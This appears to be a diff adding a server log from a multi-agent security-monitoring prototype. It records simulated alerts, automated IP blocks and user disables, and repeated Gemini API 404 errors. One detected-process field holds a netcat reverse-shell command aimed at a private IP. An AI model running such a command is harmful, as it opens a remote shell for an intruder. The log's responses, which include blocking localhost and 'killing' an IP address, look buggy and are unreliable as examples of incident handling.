@@ -1,0 +1,1159 @@
+[2026-03-06 12:59:45] GeminiAI -> Initialized with 1.5-flash.
+[2026-03-06 12:59:46] DATABASE -> CommandRoom SQLite initialized.
+[2026-03-06 12:59:46] Commander -> System initialized
+[2026-03-06 12:59:54] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:57033 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 12:59:54] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:57035 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 12:59:54] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:57037 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 12:59:54] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:57038 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 12:59:55] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:57041 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 12:59:56] Commander -> received alert from network_agent: rate_spike_detected
+[2026-03-06 12:59:56] Commander -> sending event to Gemini AI
+[2026-03-06 12:59:57] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 12:59:57] Commander -> correlating alerts
+[2026-03-06 12:59:57] Commander -> executing block_ip on 10.0.0.99
+[2026-03-06 12:59:57] ResponseEngine -> blocking IP 10.0.0.99
+[2026-03-06 12:59:57] ResponseEngine -> block_ip on 10.0.0.99
+Final Alert Object: {'id': '8df57cb3-5816-43c0-9638-0264ac883812', 'severity': 'HIGH', 'attackType': 'rate_spike_detected', 'sourceIp': '10.0.0.99', 'detectingAgent': 'network_agent', 'timestamp': '2026-03-06T07:29:54Z', 'details': {'requests_per_10s': 21}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57043 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 12:59:57] Commander -> received alert from data_agent: large_data_export_detected
+[2026-03-06 12:59:57] Commander -> sending event to Gemini AI
+[2026-03-06 12:59:57] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 12:59:57] Commander -> correlating alerts
+[2026-03-06 12:59:57] Commander -> executing block_ip on 172.16.0.5
+[2026-03-06 12:59:57] ResponseEngine -> blocking IP 172.16.0.5
+[2026-03-06 12:59:57] ResponseEngine -> block_ip on 172.16.0.5
+Final Alert Object: {'id': '236f14e7-b8cb-46ee-b6aa-75350c1aea6c', 'severity': 'CRITICAL', 'attackType': 'large_data_export_detected', 'sourceIp': '172.16.0.5', 'detectingAgent': 'data_agent', 'timestamp': '2026-03-06T07:29:54Z', 'details': {'size_mb': 1500, 'threshold_mb': 100}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57044 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 12:59:57] Commander -> received alert from identity_agent: brute_force_detected
+[2026-03-06 12:59:57] Commander -> sending event to Gemini AI
+[2026-03-06 12:59:57] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 12:59:57] Commander -> correlating alerts
+[2026-03-06 12:59:57] Commander -> executing block_ip on 192.168.1.100
+[2026-03-06 12:59:57] ResponseEngine -> blocking IP 192.168.1.100
+[2026-03-06 12:59:57] ResponseEngine -> block_ip on 192.168.1.100
+Final Alert Object: {'id': 'ef660e16-6f71-4c96-97f3-9f2078a51323', 'severity': 'HIGH', 'attackType': 'brute_force_detected', 'sourceIp': '192.168.1.100', 'detectingAgent': 'identity_agent', 'timestamp': '2026-03-06T07:29:54Z', 'details': {'username': 'admin', 'failures_per_10s': 5}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57045 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 12:59:57] Commander -> received alert from infra_agent: root_access_attempt
+[2026-03-06 12:59:57] Commander -> sending event to Gemini AI
+[2026-03-06 12:59:57] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 12:59:57] Commander -> correlating alerts
+[2026-03-06 12:59:57] Commander -> executing disable_user on www-data
+[2026-03-06 12:59:57] ResponseEngine -> disabling user www-data
+[2026-03-06 12:59:57] ResponseEngine -> disable_user on www-data
+Final Alert Object: {'id': 'f14e481d-a2ce-47dd-9399-f752ae423a4a', 'severity': 'CRITICAL', 'attackType': 'root_access_attempt', 'sourceIp': '10.1.1.50', 'detectingAgent': 'infra_agent', 'timestamp': '2026-03-06T07:29:54Z', 'details': {'user': 'www-data'}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57047 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 12:59:59] Commander -> received alert from network_agent: rate_spike_detected
+[2026-03-06 12:59:59] Commander -> sending event to Gemini AI
+[2026-03-06 12:59:59] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 12:59:59] Commander -> correlating alerts
+[2026-03-06 12:59:59] Commander -> executing block_ip on 192.168.1.100
+[2026-03-06 12:59:59] ResponseEngine -> block_ip on 192.168.1.100
+Final Alert Object: {'id': '03766416-760d-4ed4-9d58-0f8f75c9debf', 'severity': 'HIGH', 'attackType': 'rate_spike_detected', 'sourceIp': '192.168.1.100', 'detectingAgent': 'network_agent', 'timestamp': '2026-03-06T07:29:57Z', 'details': {'requests_per_10s': 21}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57054 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 12:59:59] Commander -> received alert from data_agent: large_data_export_detected
+[2026-03-06 12:59:59] Commander -> sending event to Gemini AI
+[2026-03-06 12:59:59] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 12:59:59] Commander -> correlating alerts
+[2026-03-06 12:59:59] Commander -> executing block_ip on 127.0.0.1
+[2026-03-06 12:59:59] ResponseEngine -> blocking IP 127.0.0.1
+[2026-03-06 12:59:59] ResponseEngine -> block_ip on 127.0.0.1
+Final Alert Object: {'id': 'd3b56dc8-6dbb-4d80-8125-23ee3eb0134a', 'severity': 'CRITICAL', 'attackType': 'large_data_export_detected', 'sourceIp': '127.0.0.1', 'detectingAgent': 'data_agent', 'timestamp': '2026-03-06T07:29:57Z', 'details': {'size_mb': 1737, 'threshold_mb': 100}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57056 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 12:59:59] Commander -> received alert from infra_agent: root_access_attempt
+[2026-03-06 12:59:59] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:00] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:00] Commander -> correlating alerts
+[2026-03-06 13:00:00] Commander -> executing disable_user on www-data
+[2026-03-06 13:00:00] ResponseEngine -> disable_user on www-data
+Final Alert Object: {'id': '9fff38bf-2839-49cc-8f0b-20176bd5420c', 'severity': 'CRITICAL', 'attackType': 'root_access_attempt', 'sourceIp': '10.1.1.50', 'detectingAgent': 'infra_agent', 'timestamp': '2026-03-06T07:29:57Z', 'details': {'user': 'www-data'}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57057 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:01] Commander -> received alert from network_agent: rate_spike_detected
+[2026-03-06 13:00:01] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:01] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:01] Commander -> correlating alerts
+[2026-03-06 13:00:01] Commander -> executing block_ip on 10.0.0.99
+[2026-03-06 13:00:01] ResponseEngine -> block_ip on 10.0.0.99
+Final Alert Object: {'id': '215af9cb-1c62-48bf-bcb8-637887d520e7', 'severity': 'HIGH', 'attackType': 'rate_spike_detected', 'sourceIp': '10.0.0.99', 'detectingAgent': 'network_agent', 'timestamp': '2026-03-06T07:29:59Z', 'details': {'requests_per_10s': 21}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57059 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:02] Commander -> received alert from infra_agent: root_access_attempt
+[2026-03-06 13:00:02] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:02] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:02] Commander -> correlating alerts
+[2026-03-06 13:00:02] Commander -> executing disable_user on www-data
+[2026-03-06 13:00:02] ResponseEngine -> disable_user on www-data
+Final Alert Object: {'id': 'dc7e767a-2907-4c16-9dad-f97e31b12d6e', 'severity': 'CRITICAL', 'attackType': 'root_access_attempt', 'sourceIp': '10.1.1.50', 'detectingAgent': 'infra_agent', 'timestamp': '2026-03-06T07:30:00Z', 'details': {'user': 'www-data'}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57061 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:04] Commander -> received alert from network_agent: rate_spike_detected
+[2026-03-06 13:00:04] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:04] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:04] Commander -> correlating alerts
+[2026-03-06 13:00:04] Commander -> executing block_ip on 10.0.0.99
+[2026-03-06 13:00:04] ResponseEngine -> block_ip on 10.0.0.99
+Final Alert Object: {'id': '1cb31750-6a24-46e3-a346-3c9cddb78147', 'severity': 'HIGH', 'attackType': 'rate_spike_detected', 'sourceIp': '10.0.0.99', 'detectingAgent': 'network_agent', 'timestamp': '2026-03-06T07:30:02Z', 'details': {'requests_per_10s': 21}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57064 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:04] Commander -> received alert from infra_agent: root_access_attempt
+[2026-03-06 13:00:04] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:04] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:04] Commander -> correlating alerts
+[2026-03-06 13:00:04] Commander -> executing disable_user on www-data
+[2026-03-06 13:00:04] ResponseEngine -> disable_user on www-data
+Final Alert Object: {'id': 'e5458f74-902d-41d0-aacb-d5fdbdfee000', 'severity': 'CRITICAL', 'attackType': 'root_access_attempt', 'sourceIp': '10.1.1.50', 'detectingAgent': 'infra_agent', 'timestamp': '2026-03-06T07:30:02Z', 'details': {'user': 'www-data'}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57065 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:05] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:57073 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:06] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:57076 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:06] Commander -> received alert from network_agent: rate_spike_detected
+[2026-03-06 13:00:06] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:06] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:06] Commander -> correlating alerts
+[2026-03-06 13:00:06] Commander -> executing block_ip on 10.0.0.99
+[2026-03-06 13:00:06] ResponseEngine -> block_ip on 10.0.0.99
+Final Alert Object: {'id': 'e50a6a44-0172-413d-80d9-01f076d68442', 'severity': 'HIGH', 'attackType': 'rate_spike_detected', 'sourceIp': '10.0.0.99', 'detectingAgent': 'network_agent', 'timestamp': '2026-03-06T07:30:04Z', 'details': {'requests_per_10s': 21}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57077 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:06] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:57078 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:06] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:57079 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:06] Commander -> received alert from infra_agent: root_access_attempt
+[2026-03-06 13:00:06] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:06] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:06] Commander -> correlating alerts
+[2026-03-06 13:00:06] Commander -> executing disable_user on www-data
+[2026-03-06 13:00:06] ResponseEngine -> disable_user on www-data
+Final Alert Object: {'id': 'abab251b-9072-4e62-90c6-b0ffe93d6c4f', 'severity': 'CRITICAL', 'attackType': 'root_access_attempt', 'sourceIp': '10.0.0.50', 'detectingAgent': 'infra_agent', 'timestamp': '2026-03-06T07:30:04Z', 'details': {'user': 'www-data'}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57081 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:07] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:57082 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:07] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:57084 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:08] Commander -> received alert from adaptive_agent: Analysis Error
+[2026-03-06 13:00:08] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:09] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:09] Commander -> correlating alerts
+Final Alert Object: {'id': '78e63dba-a2eb-4664-9439-ddf049bdf584', 'severity': 'HIGH', 'attackType': 'Analysis Error', 'sourceIp': '127.0.0.1', 'detectingAgent': 'adaptive_agent', 'timestamp': '2026-03-06T07:30:06Z', 'details': {'anomaly_score': -0.2392, 'ai_classification': 'Analysis Error', 'original_event_type': 'data_export', 'ai_recommendation': 'manual_review'}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57086 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:09] Commander -> received alert from infra_agent: suspicious_process_detected
+[2026-03-06 13:00:09] Commander -> sending event to Gemini AI
+[2026-03-06 13:00:09] GeminiAI -> Error: 404 models/gemini-1.5-flash is not found for API version v1beta, or is not supported for generateContent. Call ListModels to see the list of available models and their supported methods.
+[2026-03-06 13:00:09] Commander -> correlating alerts
+[2026-03-06 13:00:09] Commander -> executing kill_process on 10.0.0.10
+[2026-03-06 13:00:09] ResponseEngine -> killing process 10.0.0.10
+[2026-03-06 13:00:09] ResponseEngine -> kill_process on 10.0.0.10
+Final Alert Object: {'id': 'c139d0b5-2214-4a88-a700-76cf0cc1b001', 'severity': 'HIGH', 'attackType': 'suspicious_process_detected', 'sourceIp': '10.0.0.10', 'detectingAgent': 'infra_agent', 'timestamp': '2026-03-06T07:30:07Z', 'details': {'process_name': 'nc -e /bin/bash 192.168.1.5 4444'}, 'ai_attack_type': 'Analysis Error', 'ai_severity': 'HIGH', 'ai_recommendation': 'manual_review'}
+INFO:     127.0.0.1:57087 - "POST /agent-alert HTTP/1.1" 200 OK
+[2026-03-06 13:00:18] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:57098 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:18] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:57100 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:18] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:57101 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:18] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:57102 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:19] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:57103 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:19] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:57104 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53989 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:00:30] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55137 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:30] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55138 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:31] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55139 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:31] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55140 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:31] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55141 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:31] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55142 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:42] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55150 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:42] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55151 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:43] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55152 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:43] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55153 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:43] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55154 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:43] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55155 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:54] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55164 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:54] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55165 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:55] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55166 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:55] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55167 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:55] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55168 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:00:55] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55169 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:06] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55177 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:07] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55178 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:07] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55179 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:07] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55180 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:07] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55181 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:07] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55182 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:18] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:62039 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:19] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:62041 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:19] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:62042 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:19] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:62043 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:19] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:62044 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:19] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:62045 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55134 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:01:30] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:62052 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:31] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:61480 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:31] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:61481 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:31] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:61482 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:31] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:61483 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:31] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:61484 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:42] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:61493 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:43] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:61494 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:43] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:61495 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:43] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:61496 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:43] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:50061 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:43] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:50062 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50187 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:01:54] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:65502 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:55] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:65504 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:55] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:65505 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:55] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:65506 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:55] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:65507 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:01:55] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:65508 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:06] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:65517 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:07] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:65518 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:07] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:65519 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:07] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:65520 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:07] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:65521 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:07] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:65522 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:18] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:65531 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:19] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:63780 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:19] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:59592 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:19] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51672 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:19] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51673 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:20] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51674 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:02:31] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:50449 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:02:31] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51702 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:31] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51703 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:31] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51704 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:32] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51705 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:32] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51706 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64531 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64531 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64531 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64531 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64531 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58085 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /timeline HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /timeline HTTP/1.1" 200 OK
